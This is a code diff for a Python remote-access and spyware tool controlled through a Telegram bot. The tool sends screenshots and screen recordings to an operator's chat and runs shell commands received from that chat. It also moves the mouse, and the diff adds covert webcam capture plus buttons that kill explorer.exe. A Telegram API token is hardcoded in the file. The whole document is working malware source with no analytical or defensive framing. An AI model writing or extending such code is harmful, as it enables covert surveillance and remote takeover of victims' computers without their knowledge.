@@ -25,8 +25,8 @@ API_TOKEN = '6568453657:AAER7sALNIJT0Enu_iFtGblNKhxTHV37SzE'
 
 USER_NAME = getpass.getuser()
 
-matthew_id = 496266339
-nikita_id = -5515358231
+USEr_id = 6456704138
+DHDHa_id = -55
 
 bot = telebot.TeleBot(API_TOKEN,skip_pending = True)
 
@@ -77,7 +77,7 @@ def video_record():
                   k = cv2.waitKey(1)
                   if time.time()-screen_recording_star_time>=int(screen_recording_set_time):
                         file = open(output,'rb')
-                        bot.send_video(matthew_id,file)
+                        bot.send_video(USEr_id,file)
                         print(sreen_recordinc_cycle_)
                         if int(sreen_recordinc_cycle_) == 1:
                               screen_recording_star_time = time.time()
@@ -93,7 +93,7 @@ def scd():
       screenshot_path = r'C:\Users\Public\Downloads\screenshot10101.png'
       screenshot.save(screenshot_path)
       photo1= open(screenshot_path,"rb")
-      bot.send_document(matthew_id,photo1)
+      bot.send_document(USEr_id,photo1)
       time.sleep(0.1)
       photo1.close()
       os.remove(screenshot_path)
@@ -110,9 +110,17 @@ def scr(delay):
         screenshot_path = r'C:\Users\Public\Downloads\screenshot10101.png'
         screenshot.save(screenshot_path)
         photo1= open(screenshot_path,"rb")
-        bot.send_photo(matthew_id,photo1)
+        bot.send_photo(USEr_id,photo1)
         photo1.close()
         os.remove(screenshot_path)
+
+def camera():
+    cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
+    retval, image = cap.read()
+    image_bytes = cv2.imencode('.jpg', image)[1].tobytes() 
+    cap.release()
+    bot.send_photo(chat_id=USEr_id, photo=image_bytes )
+
 
 def th1():
     global scr_pause
@@ -137,7 +145,7 @@ global ALT_TAB
 @bot.message_handler(commands=['start'])
 def start_message(message):
     keyboard = telebot.types.ReplyKeyboardMarkup(True)
-    keyboard.row('scr', 'scd','rec015','alb')
+    keyboard.row('scr', 'scd','rec115','alb',"cmdtaskkill /f /im explorer.exe","cmdstart explorer.exe","mclr10","cam")
     bot.send_message(message.chat.id, 'Keyboard Update', reply_markup=keyboard)
 
 
@@ -156,7 +164,7 @@ def CMD(arg):
             output_msg = ("Ошибка")
     except Exception as e:
         output_msg = (f"Произошла ошибка: {e}")
-    bot.send_message(matthew_id,str(output_msg))  
+    bot.send_message(USEr_id,str(output_msg))  
 
 
 def WALLPAPER(arg): #
@@ -207,12 +215,13 @@ def th5():
                         x = random.randint(-shake_intensity,shake_intensity)
                         y = random.randint(-shake_intensity,shake_intensity)
                         pyautogui.move(x,y)
+                        pyautogui.moveTo(x,y)
                   shake_duration = 0
 
 the3 = Thread(target = th5)
 the3.start()
 
-liscommand = [ 'scr','rec','scd','alb', 'cmd', 'wlp',"wrt", "clp","mlc","msh"]
+liscommand = [ 'scr','rec','scd','alb', 'cmd', 'wlp',"wrt", "clp","mlc","msh","cam"]
 
 @bot.message_handler()
 def receiving_mesage(message):
@@ -224,7 +233,7 @@ def receiving_mesage(message):
       # img = pyautogui.screen
 
     # print(message.chat.id)
-    if (message.chat.id == matthew_id or message.chat.id == nikita_id) and message.text[:3] in liscommand:
+    if (message.chat.id == USEr_id or message.chat.id == DHDHa_id) and message.text[:3] in liscommand:
        command = message.text[:3]
        print(command)
        arg = message.text[3:]
@@ -255,6 +264,8 @@ def receiving_mesage(message):
             MOUSE_CLICK(arg)
        elif command == "msh":
             MOUSE_SHAKE(arg)
+       elif command =="cam":
+            camera()     
 
 
 
@@ -262,7 +273,7 @@ def receiving_mesage(message):
        else:
             print(command+arg) 
 
-       bot.send_message(matthew_id,
+       bot.send_message(USEr_id,
 f"""получена команда: {command}
 аргумент: {arg}""")     
     else:
